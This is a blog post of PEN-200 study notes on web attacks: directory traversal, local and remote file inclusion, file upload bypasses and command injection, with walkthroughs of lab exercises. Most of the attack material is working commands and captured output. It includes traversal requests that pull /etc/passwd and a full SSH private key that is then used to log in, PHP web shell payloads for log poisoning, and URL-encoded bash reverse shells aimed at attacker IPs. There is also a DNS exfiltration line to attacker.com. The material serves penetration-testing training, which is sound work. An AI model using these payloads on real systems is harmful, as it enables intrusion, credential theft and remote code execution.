---
title: "PEN-200 Module 9 \u2014 Weaponizing Classic Web Bugs"
slug: web-common-attacks
author: m4xx3d0ut
summary: The notebook chapters for Module 9 include payload tables, encoding tricks,
  and lab-specific notes. This revision merges those details so you can move from
  detection to exploitation without guessing.
publishedAt: '2023-08-07'
updatedAt: '2023-09-06'
readingMinutes: 79
tags:
- offsec
---
# PEN-200 Module 9 — Weaponizing Classic Web Bugs

## TLDR;

The notebook chapters for Module 9 include payload tables, encoding tricks, and lab-specific notes. This revision merges those details so you can move from detection to exploitation without guessing.

### Directory Traversal

1. Identify file-include parameters (`download.php?file=report.pdf`).
2. Inject traversal patterns:
   - `../../../../etc/passwd`
   - `..\..\..\windows\win.ini`
   - URL-encoded variants: `%2e%2e%2f`, `%2e%2e\`
3. Monitor server responses for directory errors or interesting strings.

```
# Linux target
curl -s "https://portal.acme.local/download?file=../../../../etc/passwd"

# Automated brute force
wfuzz -w wordlists/traversal-quick.txt -u https://portal.acme.local/download?file=FUZZ -mc 200
```

Document which sequences the application blocks—reporting the control is as important as the bypass.

### File Inclusion

- **LFI ➜ Info Leakage:** read log files: `/var/log/apache2/access.log`, `/proc/self/environ`.
- **Log Poisoning:** write PHP code into an access log (`User-Agent: <?php system($_GET['cmd']); ?>`) then include the log.
- **Wrapper tricks:** `php://filter/convert.base64-encode/resource=index.php` to leak source; `php://input` for inline payloads.
- **RFI:** host a PHP shell (`<?php system($_GET['cmd']); ?>`) and reference it if `allow_url_fopen` is enabled.

```
# Poison log then trigger include
curl -A "<?php system('id'); ?>" https://portal.acme.local/index.php
curl "https://portal.acme.local/include.php?page=../../../../var/log/apache2/access.log&cmd=id"
```

### File Upload Abuse

1. Capture the upload request with Burp and note validation mechanisms (extension blacklist, content-type, size limits).
2. Attempt bypasses:
   - Double extensions: `shell.php.jpg`
   - Case manipulation: `ShElL.pHp`
   - Null-byte injection: `shell.php%00.jpg`
3. If uploads land in web-root, execute directly; otherwise, pivot by dropping `.htaccess` to rewrite extensions.

```
# Identify storage path via response or download
curl -sI https://portal.acme.local/uploads/shell.php
```

### Command Injection

Look for parameters embedded in shell commands (backup utilities, ping tests).

```
; sleep 5
& ping -c 3 192.168.49.1
| powershell -nop -w hidden -e <payload>
```

- Use timing payloads (`; ping -n 5 127.0.0.1`) when output is suppressed.
- For blind exfiltration, encode data into DNS (`nslookup $(whoami).attacker.com`).

### Reporting Checklist

- Provide successful payloads, proof-of-impact output, and sanitised screenshots.
- Recommend resilient fixes: canonicalise paths, whitelist uploads, escape shell meta-characters, enforce least privilege on service accounts.
- Note chaining opportunities (e.g., traversal ➜ credential theft ➜ lateral movement).

Classic bugs persist because the detection is easy but the exploitation nuance is often missing. Keep these detailed steps in your toolkit and the labs—and client networks—fall quicker.

## Working Notes... In Graphic Detail...

#### Common Web Application Attacks

- Directory Traversal .
- File Inclusion Vulnerabilities .
- File Upload Attack Vulnerabilities .
- Command Injection .

##### 9.1 Directory Traversal

- Understand absolute and relative paths .
- Learn how to exploit directory traversal vulnerabilities .
- Use encoding for special characters .

###### Absolute vs Relative Paths

- Absolute path.
    - Referenced starting with a `/`
    - Specifies Linux root fs.
    - Example:
        - `/etc/passwd`
- Relative path.
    - Referenced starting with a `../`
    - Moves path up one level closer to root fs.
    - Example (from `home`):
        - `../../etc/passwd`
    - **NOTE:** Number of `../` sequences only valid until reaching root fs.
        - `../../../../../../../../etc/passwd`
        - Result is same.

###### Identifying and Exploiting Directory Traversals

- [Directory Traversal attacks](https://en.wikipedia.org/wiki/Directory_traversal_attack)
    - AKA path traversal attacks.
    - Attack can be used to access sensitive files on a web server.
    - Typically occurs when a web application is not sanitizing user input.
- Linux systems `/var/www/html/` directory is often used as the web root.
    - When a web application displays a page, http://example.com/file.html for example, it will try to access /var/www/html/file.html.
    - Http link doesn't contain any part of the path except the filename because the web root also serves as a base directory for a web server.
    - If a web application is vulnerable to directory traversal.
        - User may access files outside of the web root by using relative paths.
        - Thus accessing sensitive files like SSH private keys or configuration files.

**Identify Traversal Vulns**

- Hover over all buttons.
    - Checking all links.
        - Can be especially valuable.
        - May provide params or other data about app.
    - Navigate to all accessible pages.
    - Examine page source code.

Example:

```
https://example.com/cms/login.php?language=en.html
```

- `login.php` tells us the web application uses PHP.
    - Use this to develop assumptions about how to attack.
- URL contains `language` param with HTML page as value.
    - In a situation like this we should try to navigate to the file directly.
        - `https://example.com/cms/en.html`
    - If we can open it, we confirm en.html is on the server.
        - We can now use that param to try other file names.
- URL contains dir called `cms`
    - Important, it indicates the web app is running in a sub dir of web root.

**Case Study**
Examining the Mountain Deserts web app.

- First page in browser, nav bar displays file names `index.php`
    - We can conclude app uses PHP.
- Hover over all buttons and links to collect info.
    - At the bottom we find a link labeled "Admin" leading to `admin.php`
        - `http://mountaindesserts.com/meteor/index.php?page=admin.php`
        - When we click on the link, we receive an error message stating the page is currently under maintenance.
            - **Important detail for us**, since it reveals that information is shown on the same page.
            - In this case, we'll make a few assumptions about how the web application could be developed to behave in such a way.
            - Example, when we open mountaindesserts.com/meteor/admin.php in our browser.
                - Notice the same message shown on the index.php page after clicking the "Admin" link.
- We know the app uses PHP and a param called "page".
    - Assume param is used to display different pages.
    - PHP uses $_GET2 to manage variables via a GET request.
- Admin message indicates the web application includes the content of this page via the page parameter and displays it under the "Admin" link.
    - Now try to use `../` to traverse directories in the potentially-vulnerable parameter.
    - Specify a relative path to `/etc/passwd` to test the page parameter for directory traversal.

```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```

- Page shows the contents of `/etc/passwd`. We successfully leveraged the directory traversal vulnerability by using a relative path!
    
- Traversal vulns.
    
    - Mostly used for information gathering.
    - May give access to sensitive information.
- We server runs in context of `www-data` in most cases.
    
    - User context has limited access permissions on system.
        - However, users and admin typically set permissions to be very permissive.
            - As a result, we can check for presence of SSH keys and their access permissions.
- SSH keys are usually located in the home directory of a user in the `.ssh` folder.
    
    - `/etc/passwd` also contains the home directory paths of all users.
    - Output of `/etc/passwd` shows a user called `offsec`
    - Specify a relative path for the vulnerable "page" parameter to try and display the contents of the user's private key.

```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

- We successfully retrieved the private key for the `offsec` user.
    - The output, we'll notice that its formatting is a bit messy.
- As soon as we've identified a possible vulnerability, such as with the "page" parameter in this case, **we should not rely on a browser for testing**.
- We should mainly use tools such as Burp, cURL, or a programming language of our choice.

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
...
lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

- Shows that the SSH private key is formatted better using curl than in the browser.
    - Copy the SSH private key beginning at `-----BEGIN OPENSSH PRIVATE KEY-----` and ending at `-----END OPENSSH PRIVATE KEY-----`
    - Paste it into a file called `dt_key` in the home directory for the `kali` user.
- Use the private key to connect to the target system via SSH on port 2222.
    - Use the `-i` parameter to specify the stolen private key file and `-p` to specify the port.
    - We'll need to modify the permissions of the `dt_key` file so that only the user `/` owner can read the file.
        - If we don't, the ssh program will throw an error stating that the access permissions are too open.

```bash
kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
...

kali@kali:~$ chmod 400 dt_key

kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```

**Directory Traversal on Windows**

- Linux, we usually use the `/etc/passwd` file to test directory traversal vulnerabilities.
- On Windows, we can use the file `C:\Windows\System32\drivers\etc\hosts` to test directory traversal vulnerabilities.
    - Readable by all local users.
    - By displaying the file we can confirm the vuln exists.
    - It is more difficult to leverage a directory traversal vulnerability for system access on Windows than Linux.
    - N Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of `/etc/passwd`
    - Check for private keys in their home directory, and use them to access the system via SSH.
    - This vector is not available on Windows and unfortunately, there is no direct equivalent.
    - Additionally, sensitive files are often not easily found on Windows without being able to list the contents of directories.
- Once we gather information about the running application or service, we can research paths leading to sensitive files.
    - Example, if we learn that a target system is running the Internet Information Services (IIS) web server.
        - We can research its log paths and web root structure.
        - Microsoft documentation, we learn that the logs are located at `C:\inetpub\logs\LogFiles\W3SVC1\`
        - Another file we should always check when the target is running an IIS web server is `C:\inetpub\wwwroot\web.config`
            - May contain sensitive information like passwords or usernames.
    - RFC 17387 specifies to always use slashes in a URL, web applications on Windows may only be vulnerable to directory traversal using backslashes.
    - Always try to leverage both forward slashes and backslashes when examining a potential directory traversal vulnerability in a web application running on Windows.

* * *.

###### Directory Traversal Exercise Notes

**Linux Apache PHP Path Traversal**

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../etc/passwd
<!DOCTYPE html>
<html>
    <head>
...

<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
offsec:x:1000:1000::/home/offsec:/bin/bash
...
                                                                             
┌──(kali㉿kali)-[~]
└─$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../home/offsec/.ssh/id_rsa
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Delicious Desserts from the Mountains</title>
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

    <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.2.min.js"><\/script>')</script>
...
```

Save key, set perms, connect to host:

```bash
┌──(kali㉿kali)-[~]
└─$ chmod 400 dt_rsa                                 
                                                                             
┌──(kali㉿kali)-[~]
└─$ ssh -i dt_rsa offsec@mountaindesserts.com -p 2222
Linux 5dfafd5c3dc3 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64
OS{e3c6e63e6ae0a07c39ae1faece6ae237}
offsec@5dfafd5c3dc3:~$ whoami
offsec
```

**Grafana Windows Path traversal**

```bash
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://192.168.235.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
OS{40fc8290aa5efda3d0a1c3eb5615dfac}
```

* * *.

###### Encoding Special Characters

- In the "Vulnerability Scanning" topic, we scanned the SAMBA machine and identified a directory traversal vulnerability in Apache 2.4.49.1 This vulnerability can be exploited by using a relative path after specifying the cgi-bin directory in the URL.

```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>


kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

- Demonstrates that after attempting two queries with a different number of `../`, we could not display the contents of `/etc/passwd` via directory traversal.
    
- Leveraging `../` is a known way to abuse web application behavior.
    
- This sequence is often filtered by either the web server, web application firewalls, or the web application itself.
    
- Fortunately for us, we can use URL Encoding, also called Percent Encoding, to potentially bypass these filters.
    
    - We can leverage specific ASCII encoding lists4 to manually encode our query from listing 11 or use the online converter on the same page.
    - For now, we will only encode the dots, which are represented as `%2e`.

```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```

- Successfully used directory traversal with encoded dots to display the contents of `/etc/passwd` on the target machine.
- URL encoding is used to convert characters of a web request into a format that can be transmitted over the internet.
- It is also a popular method used for malicious purposes.
- Reason for this is that the encoded representation of characters in a request may be missed by filters.
    - Which only check for the plain-text representation of them e.g. `../` but not `%2e%2e/`
    - After the request passes the filter, the web application or server interprets the encoded characters as a valid request.

* * *.

###### Encoding Special Characters Exercises

**Apache cgi-bin path traversal with URL encoding**

```bash
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://192.168.235.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
OS{4fc96513e5471612d0846a523a8d199e}
```

**Grafana with URL encoding**

```bash
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://192.168.235.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin

┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://192.168.235.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/install.txt
OS{8267caf26dc5b6bb3876c10b9d8c28ef}
```

* * *.

##### 9.2 File Inclusion Vulnerabilities

```
    Learn the difference between File Inclusion and Directory Traversal vulnerabilities 
    ```
    
```
    Gain an understanding of File Inclusion vulnerabilities 
    ```
    
```
    Understand how to leverage Local File Inclusion (LFI) to obtain code Execution 
    ```
    
- ```
    Explore PHP wrapper usage 
    ```
    
```
    Learn how to perform Remote File Inclusion (RFI) attacks 
    ```
    

#### Local File Inclusion (LFI)

- Local File Inclusion (LFI) vs Directory Traversal.
    
    - Often mixed up by pen testers.
    - **Traversal** allows us to obtain the contents of a file outside of web root.
        - The source of `admin.php` would be displayed.
    - **File Inclusion** allows us to include a file in the apps running code.
        - The file `admin.php` would be executed.
- Local File Inclusion (LFI) techniques can be chained with other bugs to deliver remote code execution.
    
    - Can be used to exec local or remote files.
    - **Example:** we can achieve RCE by leveraging LFI.
        - With the help of [Log Poisoning](https://owasp.org/www-community/attacks/Log_Injection)
            - Works by modifying the data we send to the web app so logs contain executable code.
        - In an LFI vuln scenario, the local file we include is exec'd if it contains executable code.
            - I.e. - if we are able to write executable code to a file, include it in the running code, it will be exec'd.
        - The Apache `access.log` in the `/var/log/apache2` directory can be targeted if it is controlled by us and saved by Apache.
            - "controlled" means we can modify the data we are sending.
        - Use curl to analyze the elements that comprise a log entry.

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

- As we see **User Agent** is included in the log entry.
    - Before we send our request, we can modify it with Burp and specify what is written to the access log.
- The command is equivalent to the Traversal attack, but differs when handling executable files/contents.
- Modify the User Agent to include a PHP snippet for command execution on the server.
    - `<?php echo system($_GET['cmd']); ?>`
- Once the snippet has been injected update the Traversal param to point at the access log.
    - `../../../../../../../../../var/log/apache2/access.log`
- We also need to enter a `cmd` param for the PHP snippet to execute.
    - `&cmd=ls%20-ls`
        - Note the `%20` URL encode in place of a " ".
    - Add param.
        - `../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-ls`
- The response will include the output of the executed command.
    - If we see successful output from the test command we can leverage this to further the attack.
        - Start a reverse shell.
        - Add our SSH key to authorized_keys of the user.
- To launch a reverse shell.
    - Common one liner.
        - `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`
    - Keep in mind, it will likely be executed by `sh` not `bash`
        - Use `bash -c` providing the one liner as an argument to invoke `bash`
            - `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`
    - URL encode the string before sending.
        - `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`
    - The final URL param will look like:
        - `../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`
    - Before launching, start out netcat listener on the attacking system.
        - `nc -nvlp 4444`

**Windows System LFI**

- Differs from Linux when it comes to file paths and execution.
- Log files in Win are located in app specific paths.
    - Example: on a target running `XAMPP` logs will be found under `C:\xampp\apache\logs`
- PHP snipped shown will work on Win, also similar in other frameworks.
    - I.e. -.
        - [Perl](https://www.perl.org/)
        - [Active Server Pages Extended](https://en.wikipedia.org/wiki/ASP.NET)
        - [Active Server Pages](https://en.wikipedia.org/wiki/Active_Server_Pages)
        - [Java Server Pages](https://en.wikipedia.org/wiki/Jakarta_Server_Pages)
        - Etc.
- Consider an LFI vulnerability in a JSP web application.
    - If we can write JSP code to a file using Log Poisoning and include this file with the LFI vulnerability, the code will be executed.
    - The only difference between this example and the previous PHP demonstration is that the code snippet used for the Log Poisoning would be in a different language.
- Modern frameworks and languages are often by design not vulnerable or have protection mechanisms enabled by default against LFI.
    - We should be aware that we can also find LFI vulnerabilities in modern back-end JavaScript runtime environments like [Node.js](https://nodejs.org/en/)

#### Local File Inclusion (LFI) Exercises

Leverage the LFI vulnerability in the web application (located at http://mountaindesserts.com/meteor/) to receive a reverse shell on WEB18 (VM #1). Get the flag from the /home/ariella/flag.txt file. To display the contents of the file, check your sudo privileges with sudo -l and use them to read the flag.

- Admin link.
    - Under maint `http://mountaindesserts.com/meteor/index.php?page=admin.php`
    - `page` param used to open files, LFI may be possible.
        - `http://mountaindesserts.com/meteor/admin.php`
    - Request sent to Burp.
        - Performed DT shown below, UA string written to Apache access log.
        - Prepare to inject PHP on-liner `<?php echo system($_GET['cmd']); ?>` in UA header.
    - Modify user-agent in request with PHP one-line to write to log.
    - Spawn netcat reverse shell `'bash -c "bash -i >& /dev/tcp/192.168.45.198/4444 0>&1"'` with enclosing single quote.
        - Urlencode `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.198%2F4444%200%3E%261%22`

```
### In Burp, sent req from HTTP hist to Repeater, OG req snip with admin page inclusion
...
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
//
</body>
</html>
...

### Modified req with URL encoded DT string to Apache access log, user agent header logged to file

GET /meteor/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
192.168.63.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/ HTTP/1.1" 200 2361 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...

### Inject PHP, supply ps as test command for LFI, success.

GET /meteor/index.php?page=admin.php HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: <?php echo system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
...
